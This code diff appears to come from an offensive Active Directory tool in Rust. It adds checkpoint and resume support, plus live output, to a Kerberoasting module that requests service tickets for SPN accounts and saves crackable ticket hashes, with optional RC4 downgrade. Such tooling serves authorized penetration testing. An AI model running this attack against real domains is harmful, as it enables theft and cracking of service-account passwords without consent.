@@ -10,6 +10,7 @@
 use crate::runner::HuntConfig;
 use colored::Colorize;
 use indicatif::{ProgressBar, ProgressStyle};
+use overthrone_core::checkpoint::Checkpoint;
 use overthrone_core::error::Result;
 use overthrone_core::proto::kerberos::{self};
 use overthrone_core::proto::ldap;
@@ -44,6 +45,12 @@ pub struct KerberoastConfig {
     /// (AS-REP roastable — more efficiently attacked via asreproast).
     /// Default: true
     pub skip_asrep_roastable: bool,
+    /// Path to checkpoint file for resume
+    pub checkpoint_path: Option<PathBuf>,
+    /// Resume from checkpoint if available
+    pub resume: bool,
+    /// Print results as they are found
+    pub live_output: bool,
 }
 
 impl Default for KerberoastConfig {
@@ -62,6 +69,9 @@ impl Default for KerberoastConfig {
             downgrade_to_rc4: false,
             spn_filter: None,
             skip_asrep_roastable: true,
+            checkpoint_path: None,
+            resume: false,
+            live_output: true,
         }
     }
 }
@@ -277,6 +287,53 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
     }
 
     // Step 3: Request TGS for each SPN
+    let ckpt_path = kc.checkpoint_path.clone().unwrap_or_else(|| {
+        overthrone_core::checkpoint::checkpoint_path(
+            None,
+            "kerberoast",
+            &config.domain,
+            &config.dc_ip,
+        )
+    });
+    let do_resume = kc.resume && ckpt_path.exists();
+    let mut ckpt = Checkpoint::load_or_new(
+        &ckpt_path,
+        "kerberoast",
+        &config.dc_ip,
+        &config.domain,
+        spn_targets.len(),
+    );
+
+    if do_resume {
+        info!(
+            "Resuming kerberoast from checkpoint: {} ({} prior results)",
+            ckpt_path.display(),
+            ckpt.results().len()
+        );
+    }
+
+    #[allow(clippy::type_complexity)]
+    let to_process: Vec<&(String, String, Option<String>, bool, Option<String>)> = if do_resume {
+        let already: std::collections::HashSet<&str> =
+            ckpt.results().iter().map(|e| e.item.as_str()).collect();
+        let pending: Vec<_> = spn_targets
+            .iter()
+            .filter(|(_, spn, _, _, _)| !already.contains(spn.as_str()))
+            .collect();
+        if pending.is_empty() {
+            info!("All SPNs already processed — using cached results.");
+        } else {
+            info!(
+                "{} SPNs remain, skipping {} already done",
+                pending.len(),
+                spn_targets.len() - pending.len()
+            );
+        }
+        pending
+    } else {
+        spn_targets.iter().collect()
+    };
+
     let pb = ProgressBar::new(spn_targets.len() as u64);
     pb.set_style(
         ProgressStyle::default_bar()
@@ -287,18 +344,47 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
             })
             .progress_chars("█▓░"),
     );
+    pb.set_position(ckpt.processed_count() as u64);
 
-    let mut hashes = Vec::new();
-    let mut skipped = Vec::new();
-    let mut errors = Vec::new();
+    let mut hashes: Vec<RoastedService> = Vec::new();
+    let mut skipped: Vec<(String, String)> = Vec::new();
+    let mut errors: Vec<(String, String)> = Vec::new();
 
-    for (sam, spn, dn, admin_count, pwd_last_set) in &spn_targets {
+    // Restore prior results from checkpoint
+    for entry in ckpt.results() {
+        if entry.status == "hash" {
+            if let Some(ref detail) = entry.detail {
+                hashes.push(RoastedService {
+                    username: "unknown".to_string(),
+                    spn: entry.item.clone(),
+                    domain: config.domain.clone(),
+                    etype: if detail.contains("$krb5tgs$23$") {
+                        "RC4"
+                    } else if detail.contains("$krb5tgs$18$") {
+                        "AES256"
+                    } else {
+                        "AES128"
+                    }
+                    .to_string(),
+                    hash_string: detail.clone(),
+                    distinguished_name: None,
+                    admin_count: false,
+                    password_last_set: None,
+                });
+            }
+        } else if entry.status == "error" {
+            errors.push((entry.item.clone(), entry.detail.clone().unwrap_or_default()));
+        } else if entry.status == "skipped" {
+            skipped.push((entry.item.clone(), entry.detail.clone().unwrap_or_default()));
+        }
+    }
+
+    for (sam, spn, dn, admin_count, pwd_last_set) in &to_process {
         pb.set_message(spn.clone());
 
         let roast_result = if kc.downgrade_to_rc4 {
             kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, false).await
         } else {
-            // OPSEC mode: request only AES256/AES128 (no RC4 downgrade)
             kerberos::kerberoast_ex(&config.dc_ip, &tgt, spn, true).await
         };
         match roast_result {
@@ -315,7 +401,7 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
                     spn: spn.clone(),
                     domain: config.domain.clone(),
                     etype: etype_label.to_string(),
-                    hash_string: crackable.hash_string,
+                    hash_string: crackable.hash_string.clone(),
                     distinguished_name: dn.clone(),
                     admin_count: *admin_count,
                     password_last_set: pwd_last_set.clone(),
@@ -326,24 +412,30 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
                 } else {
                     String::new()
                 };
-                info!(
-                    "  {} {} ({}) — {} {}{}",
-                    "✓".green(),
-                    sam.bold(),
-                    spn.dimmed(),
-                    "etype:".dimmed(),
-                    etype_label.cyan(),
-                    marker
-                );
+
+                ckpt.record(spn, "hash", Some(crackable.hash_string.clone()));
+
+                if kc.live_output {
+                    println!(
+                        "  {} {} ({}) — {} {}{}",
+                        "✓".green(),
+                        sam.bold(),
+                        spn.dimmed(),
+                        "etype:".dimmed(),
+                        etype_label.cyan(),
+                        marker
+                    );
+                }
+
                 hashes.push(roasted);
             }
             Err(e) => {
                 let err_str = e.to_string();
                 if err_str.contains("S_PRINCIPAL_UNKNOWN") {
-                    debug!("  {} {} — SPN not found", "→".dimmed(), spn);
+                    ckpt.record(spn, "skipped", Some("SPN not found".to_string()));
                     skipped.push((spn.clone(), "SPN not found".to_string()));
                 } else {
-                    warn!("  {} {} — {}", "✗".red(), spn, err_str);
+                    ckpt.record(spn, "error", Some(err_str.clone()));
                     errors.push((spn.clone(), err_str));
                 }
             }
@@ -353,6 +445,12 @@ pub async fn run(config: &HuntConfig, kc: &KerberoastConfig) -> Result<Kerberoas
         pb.inc(1);
     }
     pb.finish_with_message("done");
+    ckpt.save();
+
+    // Clean up checkpoint on full success
+    if errors.is_empty() && to_process.len() == spn_targets.len() && !hashes.is_empty() {
+        let _ = std::fs::remove_file(&ckpt_path);
+    }
 
     // Step 4: Save hashes
     if let Some(ref output_path) = kc.output_file {
